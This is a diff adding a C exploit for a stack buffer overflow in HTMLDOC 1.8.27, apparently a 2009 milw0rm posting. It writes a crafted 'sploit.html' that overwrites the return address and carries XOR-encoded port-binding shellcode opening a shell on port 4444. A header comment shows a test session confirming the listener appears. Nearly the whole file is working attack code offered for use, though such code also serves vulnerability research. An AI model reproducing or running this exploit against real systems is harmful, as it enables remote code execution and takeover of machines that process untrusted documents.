@@ -1,0 +1,81 @@
+/*
+
+HTMLDOC 'html' File Handling Remote Stack Buffer Overflow Exploit (Linux)
+Reference: http://www.securityfocus.com/bid/35727
+
+Tested on HTMLDOC 1.8.27 on Debian 5.0 (+ASLR)
+Credit: ANTHRAX666 for finding the vulnerability
+
+Coded by Pankaj Kohli
+http://www.pank4j.com
+
+pankaj@zion:~/test/htmldoc$ cat /proc/sys/kernel/randomize_va_space
+2
+pankaj@zion:~/test/htmldoc$ gcc htmldocb0f.c -o htmldocb0f
+pankaj@zion:~/test/htmldoc$ ./htmldocb0f
+
+[*] Creating buffer
+[*] Exploit file written to sploit.html
+Run as: htmldoc -f somefile.pdf sploit.html
+
+pankaj@zion:~/test/htmldoc$ netstat -an --inet | grep 4444
+pankaj@zion:~/test/htmldoc$ ./htmldoc-1.8.27/htmldoc/htmldoc -f abc.pdf sploit.html &
+[1] 3287
+pankaj@zion:~/test/htmldoc$ netstat -an --inet | grep 4444
+tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN
+
+*/
+
+#include <stdio.h>
+#include <string.h>
+
+
+/* Port binding (xor encoded) shellcode (port 4444) */
+char code[] =
+"\xeb\x12\x5b\x31\xc9\xb1\x75\x8a\x03\x34"
+"\x1e\x88\x03\x43\x66\x49\x75\xf5\xeb\x05"
+"\xe8\xe9\xff\xff\xff\x74\x78\x46\x74\x1f"
+"\x45\x2f\xd7\x4f\x74\x1f\x74\x1c\x97\xff"
+"\xd3\x9e\x97\xd8\x2f\xcc\x4c\x78\x76\x0f"
+"\x42\x78\x76\x1c\x1e\x97\xff\x74\x0e\x4f"
+"\x4e\x97\xff\xad\x1c\x74\x78\x46\xd3\x9e"
+"\xae\x78\xad\x1a\xd3\x9e\x4c\x48\x97\xff"
+"\x5d\x74\x78\x46\xd3\x9e\x97\xdd\x74\x1c"
+"\x47\x74\x21\x46\xd3\x9e\xfc\xe7\x74\x21"
+"\x46\xd3\x9e\x2f\xcc\x4c\x76\x70\x31\x6d"
+"\x76\x76\x31\x31\x7c\x77\x97\xfd\x4c\x78"
+"\x76\x33\x77\x97\xff\x4c\x4f\x4d\x97\xff"
+"\x74\x15\x46\xd3\x9e\x74\x1f\x46\x2f\xc5"
+"\xd3\x9e";
+
+long jmp = 0x0804d938;  // push esp; ret 0x0807;  ;-) 
+
+int main(int argc, char **argv, char **envp) {
+	char buff[512];
+	int i;
+	FILE *fd;
+
+	printf("\n[*] Creating buffer\n");
+        strcpy(buff, "<!-- MEDIA SIZE 1x1");
+        for(i=0; i<275; i++) {
+                buff[19+i] = 'A';
+        }
+
+	buff[294] = jmp & 0x000000ff;
+	buff[295] = (jmp & 0x0000ff00) >> 8;
+	buff[296] = (jmp & 0x00ff0000) >> 16;
+	buff[297] = (jmp & 0xff000000) >> 24;
+	buff[298] = 0;
+
+	strcat(buff, code);
+
+	fd = fopen("sploit.html", "wb");
+	fprintf(fd, "%s", buff);
+	fclose(fd);
+	printf("[*] Exploit file written to sploit.html\n");
+	printf("Run as: htmldoc -f somefile.pdf sploit.html\n\n");
+
+	return 0;
+}
+
+// milw0rm.com [2009-09-09]
